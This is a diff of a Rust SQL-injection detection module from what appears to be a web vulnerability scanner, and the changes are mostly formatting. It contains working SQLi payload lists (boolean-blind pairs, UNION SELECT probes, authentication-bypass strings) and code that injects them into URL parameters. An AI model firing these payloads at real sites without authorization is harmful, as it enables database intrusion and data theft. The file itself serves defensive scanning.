@@ -1,9 +1,11 @@
 //! SQL Injection detection — error-based, boolean-blind, time-blind, OOB, stacked queries.
 
+use grym_core::{
+    AssetRef, Confidence, Evidence, Finding, ScopedClient, ScopedClientError, Severity,
+    TechniqueTier,
+};
 use regex::Regex;
 use url::Url;
-use grym_core::{Confidence, Finding, AssetRef, Severity, Evidence,
-                ScopedClient, ScopedClientError, TechniqueTier};
 
 /// SQL error patterns for error-based detection across DBMS types.
 const SQL_ERROR_PATTERNS: &[&str] = &[
@@ -59,9 +61,18 @@ const BOOLEAN_BLIND_PAYLOADS: &[(&str, &str)] = &[
     ("' OR 1=1--", "' OR 1=2--"),
     ("' AND 1=1--", "' AND 1=2--"),
     ("' OR 'a'='a", "' OR 'a'='b"),
-    ("' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--", "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))<0--"),
-    ("1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
-    ("' AND (SELECT LENGTH(DATABASE()))>0--", "' AND (SELECT LENGTH(DATABASE()))<0--"),
+    (
+        "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0--",
+        "' OR ASCII(SUBSTRING((SELECT DATABASE()),1,1))<0--",
+    ),
+    (
+        "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+        "1 AND (SELECT COUNT(*) FROM information_schema.tables)<0--",
+    ),
+    (
+        "' AND (SELECT LENGTH(DATABASE()))>0--",
+        "' AND (SELECT LENGTH(DATABASE()))<0--",
+    ),
 ];
 
 /// Union-based SQLi payloads with various column counts and encodings.
@@ -161,7 +172,6 @@ const MULTI_STAGE_SQLI: &[&str] = &[
 
 const DBMS_COMMENT: &str = " /**/ ";
 
-
 /// Full list of all URL parameters in a URL query or in the request body.
 fn get_all_params(url: &Url) -> Vec<(String, String)> {
     url.query_pairs()
@@ -170,13 +180,22 @@ fn get_all_params(url: &Url) -> Vec<(String, String)> {
 }
 
 /// Injects a payload into one parameter while preserving others.
-fn inject_payload(url: &Url, params: &[(String, String)], target_param: &str, payload: &str) -> Url {
+fn inject_payload(
+    url: &Url,
+    params: &[(String, String)],
+    target_param: &str,
+    payload: &str,
+) -> Url {
     let mut test_url = url.clone();
     {
         let mut pairs = test_url.query_pairs_mut();
         pairs.clear();
         for (k, v) in params {
-            let val = if k == target_param { payload.to_string() } else { v.clone() };
+            let val = if k == target_param {
+                payload.to_string()
+            } else {
+                v.clone()
+            };
             pairs.append_pair(k, &val);
         }
     }
@@ -187,18 +206,19 @@ fn inject_payload(url: &Url, params: &[(String, String)], target_param: &str, pa
 fn check_sql_error(body: &str, _payload: &str, param_name: &str, url: &Url) -> Option<Finding> {
     for pattern in SQL_ERROR_PATTERNS {
         if let Ok(re) = Regex::new(pattern)
-            && re.is_match(body) {
-                return Some(Finding::new(
-                    format!("SQL Injection (error-based) in parameter '{}'", param_name),
-                    AssetRef {
-                        identifier: url.to_string(),
-                        kind: "web".into(),
-                    },
-                    Severity::Critical,
-                    Confidence::Confirmed,
-                    "grym-web-scanner",
-                ));
-            }
+            && re.is_match(body)
+        {
+            return Some(Finding::new(
+                format!("SQL Injection (error-based) in parameter '{}'", param_name),
+                AssetRef {
+                    identifier: url.to_string(),
+                    kind: "web".into(),
+                },
+                Severity::Critical,
+                Confidence::Confirmed,
+                "grym-web-scanner",
+            ));
+        }
     }
     None
 }
@@ -210,9 +230,10 @@ fn check_time_based_indicator(body: &str, response_time_ms: u128) -> bool {
     }
     for pattern in SQL_ERROR_PATTERNS {
         if let Ok(re) = Regex::new(pattern)
-            && re.is_match(body) {
-                return true;
-            }
+            && re.is_match(body)
+        {
+            return true;
+        }
     }
     false
 }
@@ -246,26 +267,34 @@ pub async fn check_sqli(
             HTML_ENTITY_SQLI,
             WAF_BYPASS_SQLI,
             MULTI_STAGE_SQLI,
-        ].concat() {
+        ]
+        .concat()
+        {
             let test_url = inject_payload(url, &base_query, param_name, payload);
 
             if let Ok(response) = client
-                .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
+                .get(
+                    "grym-web-scanner",
+                    test_url,
+                    TechniqueTier::StandardDetection,
+                )
                 .await
-                && let Some(finding) = check_sql_error(&response.body, payload, param_name, url) {
-                    let mut f = finding;
-                    f.categories.push("A05:2025-Injection".into());
-                    f.cwe_ids.push(89);
-                    f.evidence.push(Evidence::redacted(
-                        "sqli-error-based",
-                        format!("SQL error pattern matched with payload: {}", payload),
-                        response.body.chars().take(200).collect::<String>(),
-                    ));
-                    f.remediation = "Use parameterized queries or prepared statements with proper input validation and escaping.".into();
-                    f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
-                    param_findings.push(f);
-                    break;
-                }
+                && let Some(finding) = check_sql_error(&response.body, payload, param_name, url)
+            {
+                let mut f = finding;
+                f.categories.push("A05:2025-Injection".into());
+                f.cwe_ids.push(89);
+                f.evidence.push(Evidence::redacted(
+                    "sqli-error-based",
+                    format!("SQL error pattern matched with payload: {}", payload),
+                    response.body.chars().take(200).collect::<String>(),
+                ));
+                f.remediation = "Use parameterized queries or prepared statements with proper input validation and escaping.".into();
+                f.references
+                    .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
+                param_findings.push(f);
+                break;
+            }
         }
 
         // Phase 2: Boolean-based blind detection
@@ -275,37 +304,50 @@ pub async fn check_sqli(
             let false_url = inject_payload(url, &base_query, param_name, false_payload);
 
             let true_response = client
-                .get("grym-web-scanner", true_url, TechniqueTier::StandardDetection)
+                .get(
+                    "grym-web-scanner",
+                    true_url,
+                    TechniqueTier::StandardDetection,
+                )
                 .await
                 .ok();
             let false_response = client
-                .get("grym-web-scanner", false_url, TechniqueTier::StandardDetection)
+                .get(
+                    "grym-web-scanner",
+                    false_url,
+                    TechniqueTier::StandardDetection,
+                )
                 .await
                 .ok();
 
             if let (Some(tr), Some(fr)) = (true_response, false_response)
-                && check_boolean_indicators(&tr.body, &fr.body) {
-                    let mut f = Finding::new(
-                        format!("Boolean-based SQL Injection detected in parameter '{}'", param_name),
-                        AssetRef {
-                            identifier: url.to_string(),
-                            kind: "web".into(),
-                        },
-                        Severity::Critical,
-                        Confidence::Likely,
-                        "grym-web-scanner",
-                    );
-                    f.categories.push("A05:2025-Injection".into());
-                    f.cwe_ids.push(89);
-                    f.evidence.push(Evidence::redacted(
-                        "sqli-boolean",
-                        "Boolean blind: true payload returned different content vs false payload",
-                        tr.body.chars().take(200).collect::<String>(),
-                    ));
-                    f.remediation = "Use parameterized queries. Implement proper access controls and input validation.".into();
-                    f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
-                    param_findings.push(f);
-                }
+                && check_boolean_indicators(&tr.body, &fr.body)
+            {
+                let mut f = Finding::new(
+                    format!(
+                        "Boolean-based SQL Injection detected in parameter '{}'",
+                        param_name
+                    ),
+                    AssetRef {
+                        identifier: url.to_string(),
+                        kind: "web".into(),
+                    },
+                    Severity::Critical,
+                    Confidence::Likely,
+                    "grym-web-scanner",
+                );
+                f.categories.push("A05:2025-Injection".into());
+                f.cwe_ids.push(89);
+                f.evidence.push(Evidence::redacted(
+                    "sqli-boolean",
+                    "Boolean blind: true payload returned different content vs false payload",
+                    tr.body.chars().take(200).collect::<String>(),
+                ));
+                f.remediation = "Use parameterized queries. Implement proper access controls and input validation.".into();
+                f.references
+                    .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
+                param_findings.push(f);
+            }
         }
 
         // Phase 3: Time-based blind detection
@@ -314,35 +356,44 @@ pub async fn check_sqli(
                 let test_url = inject_payload(url, &base_query, param_name, payload);
                 let start = std::time::Instant::now();
                 let response = client
-                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
+                    .get(
+                        "grym-web-scanner",
+                        test_url,
+                        TechniqueTier::StandardDetection,
+                    )
                     .await
                     .ok();
                 let elapsed = start.elapsed().as_millis();
 
                 if let Some(_r) = response
-                    && elapsed > 2500 {
-                        let mut f = Finding::new(
-                            format!("Time-based SQL Injection detected in parameter '{}'", param_name),
-                            AssetRef {
-                                identifier: url.to_string(),
-                                kind: "web".into(),
-                            },
-                            Severity::Critical,
-                            Confidence::Confirmed,
-                            "grym-web-scanner",
-                        );
-                        f.categories.push("A05:2025-Injection".into());
-                        f.cwe_ids.push(89);
-                        f.evidence.push(Evidence::redacted(
-                            "sqli-time",
-                            format!("Time-based blind SQLi: payload took {}ms", elapsed),
-                            format!("Payload: {}, Response time: {}ms", payload, elapsed),
-                        ));
-                        f.remediation = "Use parameterized queries with proper timeout handling and input validation.".into();
-                        f.references.push("https://owasp.org/www-community/attacks/Blind_SQL_Injection".into());
-                        param_findings.push(f);
-                        break;
-                    }
+                    && elapsed > 2500
+                {
+                    let mut f = Finding::new(
+                        format!(
+                            "Time-based SQL Injection detected in parameter '{}'",
+                            param_name
+                        ),
+                        AssetRef {
+                            identifier: url.to_string(),
+                            kind: "web".into(),
+                        },
+                        Severity::Critical,
+                        Confidence::Confirmed,
+                        "grym-web-scanner",
+                    );
+                    f.categories.push("A05:2025-Injection".into());
+                    f.cwe_ids.push(89);
+                    f.evidence.push(Evidence::redacted(
+                        "sqli-time",
+                        format!("Time-based blind SQLi: payload took {}ms", elapsed),
+                        format!("Payload: {}, Response time: {}ms", payload, elapsed),
+                    ));
+                    f.remediation = "Use parameterized queries with proper timeout handling and input validation.".into();
+                    f.references
+                        .push("https://owasp.org/www-community/attacks/Blind_SQL_Injection".into());
+                    param_findings.push(f);
+                    break;
+                }
             }
         }
 
@@ -352,7 +403,11 @@ pub async fn check_sqli(
                 let test_url = inject_payload(url, &base_query, param_name, payload);
 
                 if let Ok(response) = client
-                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
+                    .get(
+                        "grym-web-scanner",
+                        test_url,
+                        TechniqueTier::StandardDetection,
+                    )
                     .await
                 {
                     // Check for successful UNION (200 instead of 500, different content length)
@@ -362,11 +417,14 @@ pub async fn check_sqli(
                             && response.body.len() > 20;
 
                         if is_valid_union && response.body.starts_with("<") {
-                            let has_content_variation = !response.body.contains("&lt;")
-                                && response.body.len() > 100;
+                            let has_content_variation =
+                                !response.body.contains("&lt;") && response.body.len() > 100;
                             if has_content_variation {
                                 let mut f = Finding::new(
-                                    format!("UNION-based SQL Injection detected in parameter '{}'", param_name),
+                                    format!(
+                                        "UNION-based SQL Injection detected in parameter '{}'",
+                                        param_name
+                                    ),
                                     AssetRef {
                                         identifier: url.to_string(),
                                         kind: "web".into(),
@@ -383,7 +441,9 @@ pub async fn check_sqli(
                                     response.body.chars().take(200).collect::<String>(),
                                 ));
                                 f.remediation = "Use parameterized queries. Restrict database user permissions to minimize UNION-based data extraction.".into();
-                                f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
+                                f.references.push(
+                                    "https://owasp.org/www-community/attacks/SQL_Injection".into(),
+                                );
                                 param_findings.push(f);
                                 break;
                             }
@@ -399,14 +459,21 @@ pub async fn check_sqli(
                 let test_url = inject_payload(url, &base_query, param_name, payload);
 
                 if let Ok(response) = client
-                    .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
+                    .get(
+                        "grym-web-scanner",
+                        test_url,
+                        TechniqueTier::StandardDetection,
+                    )
                     .await
                 {
-                    let is_success = response.status == 200
-                        || response.body.contains("GRYM_STACKED_TEST");
+                    let is_success =
+                        response.status == 200 || response.body.contains("GRYM_STACKED_TEST");
                     if is_success {
                         let mut f = Finding::new(
-                            format!("Stacked query SQL Injection detected in parameter '{}'", param_name),
+                            format!(
+                                "Stacked query SQL Injection detected in parameter '{}'",
+                                param_name
+                            ),
                             AssetRef {
                                 identifier: url.to_string(),
                                 kind: "web".into(),
@@ -423,7 +490,8 @@ pub async fn check_sqli(
                             response.body.chars().take(200).collect::<String>(),
                         ));
                         f.remediation = "Avoid stacked queries in database APIs. Use parameterized queries with single-statement execution.".into();
-                        f.references.push("https://owasp.org/www-community/attacks/SQL_Injection".into());
+                        f.references
+                            .push("https://owasp.org/www-community/attacks/SQL_Injection".into());
                         param_findings.push(f);
                         break;
                     }
@@ -439,13 +507,32 @@ pub async fn check_sqli(
 
 /// Legacy payload list for compatibility and backward-compatible scanning.
 const SQLI_PAYLOADS: &[&str] = &[
-    "'", "\"", "')", "'--", "'-- -", "'#", "';--",
-    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'#",
-    " OR 1=1--", " OR '1'='1'", "admin'--",
-    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
-    "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=1",
-    "1 AND 1=2", "1 OR 1=1", "1 OR 1=2",
-    "admin' OR '1'='1", "admin'--", "admin'/*",
-    "') OR ('1'='1", "' OR 1=1", "\" OR 1=1",
-    "'/**/OR/**/1=1", "\"/**/OR/**/1=1",
+    "'",
+    "\"",
+    "')",
+    "'--",
+    "'-- -",
+    "'#",
+    "';--",
+    "' OR '1'='1",
+    "' OR '1'='1'--",
+    "' OR '1'='1'#",
+    " OR 1=1--",
+    " OR '1'='1'",
+    "admin'--",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "' UNION SELECT NULL,NULL,NULL--",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "1 OR 1=1",
+    "1 OR 1=2",
+    "admin' OR '1'='1",
+    "admin'--",
+    "admin'/*",
+    "') OR ('1'='1",
+    "' OR 1=1",
+    "\" OR 1=1",
+    "'/**/OR/**/1=1",
+    "\"/**/OR/**/1=1",
 ];
